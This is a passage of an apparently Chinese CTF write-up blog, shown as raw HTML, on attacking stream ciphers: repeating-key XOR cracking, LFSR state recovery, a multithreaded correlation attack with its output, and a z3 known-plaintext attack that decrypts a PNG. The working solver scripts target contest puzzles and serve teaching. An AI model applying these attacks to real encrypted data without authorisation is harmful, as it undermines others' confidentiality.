class="keyword">for</span> key_length, _ <span class="keyword">in</span> average_distances[:<span class="number">5</span>]:</span><br><span class="line">        key = []</span><br><span class="line">        cipher_fragments = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(key_length)]</span><br><span class="line">        <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(cipher):</span><br><span class="line">            cipher_fragments[i % key_length].append(byte)</span><br><span class="line">        <span class="keyword">for</span> cipher_fragment <span class="keyword">in</span> cipher_fragments:</span><br><span class="line">            key.append(crack_key_fragment(cipher_fragment))</span><br><span class="line">        print(bytes(key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    masked_cipher = <span class="string">b'input your masked_cipher here'</span></span><br><span class="line">    salt = <span class="string">b'input your salt here'</span></span><br><span class="line">    cipher = bytes_xor(masked_cipher, salt *</span><br><span class="line">                       (len(masked_cipher) // len(salt) + <span class="number">1</span>))</span><br><span class="line">    average_distances = get_key_length(cipher)</span><br><span class="line">    crack_key(cipher, average_distances)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="lfsr---basis">LFSR - Basis</h3><h4 id="theorem-1">Theorem</h4><p>单个lfsr且已知抽头序列的情况下，只要有任意n个比特的流信息，即可轻易恢复完整流</p><p>等价于解n元1次方程（18年国赛streamgame）</p><h4 id="exp-1">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[26]</span></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">mask_bin = bin(mask)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)</span><br><span class="line">feedback = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> mask_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        feedback.append(i)</span><br><span class="line">feedback.append(<span class="number">32</span>)</span><br><span class="line">delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]</span></span><br><span class="line">cipher = open(<span class="string">"key"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]</span></span><br><span class="line">cipher_bin = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    cipher_bin += bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[30]</span></span><br><span class="line">cur = cipher_bin[:feedback[<span class="number">-1</span>] + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">    left = str(right.count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line">    flag = left + flag</span><br><span class="line">    cur = left + cur[:<span class="number">-1</span>]</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[36]</span></span><br><span class="line"><span class="string">'00110000011111010101001001100100'</span></span><br></pre></td></tr></table></figure><h3 id="lfsr---correlation-attack">LFSR - Correlation Attack</h3><h4 id="theorem-2">Theorem</h4><p>实际使用的lfsr往往是多个lfsr并行，并通过代数运算F来获得密钥流</p><p><img src= "/img/loading.gif" data-src="/2020/03/12/Summary-of-Crypto-in-CTF-stream/Snipaste_2020-03-13_15-00-29.png"></p><p>列出代数运算F的真值表，即可得到相关系数<span class="math inline">\(p_{1},...,p_{n}\)</span></p><p>一般认为在<span class="math inline">\(p_{i}\geq 0.6\)</span>时，能使用相关攻击对第i个lfsr的密钥流实现恢复(<span class="math inline">\(p_{i}=0.75\)</span>时效果较好)</p><p>相关攻击使得复杂度从<span class="math inline">\(\prod\)</span>优化为<span class="math inline">\(\sum\)</span>，余下相关系数趋于0.5的lfsr采用暴力枚举即可</p><h4 id="exp-2">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line">R1_mask, R2_mask, R3_mask = <span class="number">0x10020</span>, <span class="number">0x4100c</span>, <span class="number">0x100002</span></span><br><span class="line">R1_partMask, R2_partMask, R3_partMask = <span class="number">0xffffff</span>, <span class="number">0xffffff</span>, <span class="number">0xffffff</span></span><br><span class="line">n1, n2, n3 = <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span></span><br><span class="line">R = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">crack_state = [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>]  <span class="comment"># 相关攻击是否已完成(退出其他线程)</span></span><br><span class="line">start = time.clock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(read_length)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher</span><br><span class="line">    cipher_bytes = open(<span class="string">'cipher'</span>, <span class="string">'rb'</span>).read(read_length)</span><br><span class="line">    cipher = <span class="string">''</span>.join(bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> cipher_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R, mask, partMask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; partMask</span><br><span class="line">    i = (R &amp; mask) &amp; partMask</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_lfsr</span><span class="params">(R, mask, partMask, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R, out) = lfsr(R, mask, partMask)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1, R2, R3)</span>:</span></span><br><span class="line">    (R1_new, x1) = lfsr(R1, R1_mask, R1_partMask)</span><br><span class="line">    (R2_new, x2) = lfsr(R2, R2_mask, R2_partMask)</span><br><span class="line">    (R3_new, x3) = lfsr(R3, R3_mask, R3_partMask)</span><br><span class="line">    <span class="keyword">return</span> (R1_new, R2_new, R3_new, (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(R1, R2, R3, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R1, R2, R3, out) = single_round(R1, R2, R3)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">correlation</span><span class="params">(single_cipher, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(single_cipher) == len(cipher))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(single_cipher, cipher):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count / len(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_p</span><span class="params">()</span>:</span></span><br><span class="line">    p1, p2, p3 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                value = (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3)</span><br><span class="line">                p1 += x1 ^ value ^ <span class="number">1</span></span><br><span class="line">                p2 += x2 ^ value ^ <span class="number">1</span></span><br><span class="line">                p3 += x3 ^ value ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (p1 / <span class="number">8</span>, p2 / <span class="number">8</span>, p3 / <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask, low, high, index)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[index - <span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        single_cipher = single_lfsr(guess_R, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print((hex(guess_R)[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), correlation_value))</span><br><span class="line">            R[index - <span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[index - <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        guess_cipher = encrypt(R[<span class="number">0</span>], guess_R, R[<span class="number">2</span>], len(cipher))</span><br><span class="line">        <span class="keyword">if</span> guess_cipher == cipher:</span><br><span class="line">            R[<span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    init_stream(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># crack_p (step 1)</span></span><br><span class="line">    (p1, p2, p3) = crack_p()</span><br><span class="line">    print((p1, p2, p3))</span><br><span class="line">    <span class="comment"># correlation attack (step 2)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n1 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p1, R1_mask, R1_partMask, low, high, <span class="number">1</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    low = <span class="number">2</span>**(n3 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p3, R3_mask, R3_partMask, low, high, <span class="number">3</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="comment"># brute_force (step 3)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n2 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=brute_force, args=(low, high))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(hex(R[<span class="number">0</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">1</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">2</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(0.75, 0.5, 0.75)</span><br><span class="line">('01b9cb', 0.74755859375)</span><br><span class="line">cost 30.8923027s</span><br><span class="line">('16b2f3', 0.74169921875)</span><br><span class="line">cost 362.5205596s</span><br><span class="line">cost 436.23293620000004s</span><br><span class="line">01b9cb05979c16b2f3</span><br></pre></td></tr></table></figure><h4 id="more">More</h4><p>exp对应的是强网杯streamgame3，在pypy3下大约七八分钟能出答案，但python3估计就有点儿慢了-.-</p><p>网上现在传的版本大多也都只是相关攻击，顶多在多线程上进行部分优化</p><p>快速相关攻击的A算法原理理解很容易，但我编写脚本测试后发现出不来...暂时搁置</p><p>安全客上有一篇讲LFSR相关攻击的文章，分别用了开普敦大学的轮子和z3约束来进行求解，链接如下</p><p><a href="https://www.anquanke.com/post/id/184828" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184828</a></p><h3 id="lfsr---known-plain-attack">LFSR - Known Plain Attack</h3><h4 id="theorem-3">Theorem</h4><p>LFSR的KPA问题（已知明文长度要大等于两倍的LFSR级数n）</p><ul><li>对LFSR级数n进行range(2, len(stream) // 2)上的爆破（stream是已知明文段）</li><li>因为<span class="math inline">\(len(stream)//2\geq n\)</span>，所以每个猜测级数i下均对应至少i个i元线性方程（系数矩阵秩&lt;i情况一般不考虑）</li><li>LFSR的下一位只受当前n位和抽头序列影响，因此得到n个GF(2)上形如<span class="math inline">\(\sum_{i=1}^{n}p_{i}\)</span>, if stream[i]==1的线性方程，于是抽头序列<span class="math inline">\(\\{p_{i}\\}\)</span>获知，恢复全部明文并校验即可</li></ul><h4 id="exp-3">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47 = BitVecs(</span><br><span class="line">    <span class="string">'p0 p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 p17 p18 p19 p20 p21 p22 p23 p24 p25 p26 p27 p28 p29 p30 p31 p32 p33 p34 p35 p36 p37 p38 p39 p40 p41 p42 p43 p44 p45 p46 p47'</span>, <span class="number">1</span>)</span><br><span class="line">p = [p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24,</span><br><span class="line">     p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(known_plain, known_cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known_plain) == len(known_cipher) <span class="keyword">and</span> len(known_plain) &lt;= <span class="number">24</span>)</span><br><span class="line">    known_plain_dec = int(known_plain, <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#known_plain_dec = int('89504E470D0A1A0A0000000D', 16)</span></span><br><span class="line">    known_cipher_dec = int(known_cipher, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> bin(known_plain_dec ^ known_cipher_dec)[<span class="number">2</span>:].rjust(<span class="number">4</span> * len(known_plain), <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(stream, key_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(stream) &gt;= <span class="number">2</span> * key_length)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment">#var_name = ['p' + str(i) for i in range(key_length)]</span></span><br><span class="line">    <span class="comment">#exec('&#123;&#125;=BitVecs(\'&#123;&#125;\',1)'.format(",".join(var_name), " ".join(var_name)))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(stream) - key_length):</span><br><span class="line">        cur = stream[i: i + key_length + <span class="number">1</span>]</span><br><span class="line">        equation = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_length):</span><br><span class="line">            <span class="keyword">if</span> cur[j] == <span class="string">'1'</span>:</span><br><span class="line">                equation += <span class="string">'p'</span> + str(j) + <span class="string">'+'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> len(equation):</span><br><span class="line">            equation = equation[:<span class="number">-1</span>] + <span class="string">' == '</span> + str(cur[<span class="number">-1</span>])</span><br><span class="line">            solver.add(eval(equation))</span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        feedback = <span class="string">''</span>.join([str(m[p[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> range(key_length)])</span><br><span class="line">        <span class="comment">#print('[&#123;&#125;]: ini_key = \'&#123;&#125;\' ; feedback = \'&#123;&#125;\''.format(str(key_length), stream[:key_length], feedback))</span></span><br><span class="line">        <span class="keyword">return</span> (stream[:key_length], feedback)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    cur_num = int(cur, <span class="number">2</span>)</span><br><span class="line">    output = (cur_num &lt;&lt; <span class="number">1</span>) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    i = (cur_num &amp; int(feedback, <span class="number">2</span>)) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    output = bin(output)[<span class="number">2</span>:].rjust(len(cur), <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_byte</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(cur) &gt;= <span class="number">8</span>:</span><br><span class="line">        byte = int(cur[:<span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            cur, lastbit = lfsr(cur, feedback)</span><br><span class="line">        <span class="keyword">return</span> (cur, byte)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte = cur</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span> - len(cur)):</span><br><span class="line">            cur, lastbit = lfsr(cur, feedback)</span><br><span class="line">            byte += str(lastbit)</span><br><span class="line">        <span class="keyword">return</span> (cur, int(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = open(<span class="string">'lfsr.png.encrypt'</span>, <span class="string">"rb"</span>).read()</span><br><span class="line">    <span class="comment"># kpa_attack for length(hex) &lt;= 24</span></span><br><span class="line">    stream = init_stream(<span class="string">'89504E470D0A1A0A0000000D'</span>,</span><br><span class="line">                         <span class="string">'e63b037e74c01aeefd6552ef'</span>)</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, len(stream) // <span class="number">2</span>):</span><br><span class="line">        key, feedback = crack_key(stream, key_length)</span><br><span class="line">        <span class="keyword">if</span> (key, feedback) != (<span class="literal">False</span>, <span class="literal">False</span>):</span><br><span class="line">            cur = key</span><br><span class="line">            fw = open(<span class="string">'lsfr_&#123;&#125;.png'</span>.format(key_length), <span class="string">'wb'</span>)</span><br><span class="line">            plain = <span class="string">b''</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">                cur, byte = get_byte(cur, feedback)</span><br><span class="line">                plain += bytes([cipher[i] ^ byte])</span><br><span class="line">            fw.write(plain)</span><br><span class="line">            fw.close()</span><br><span 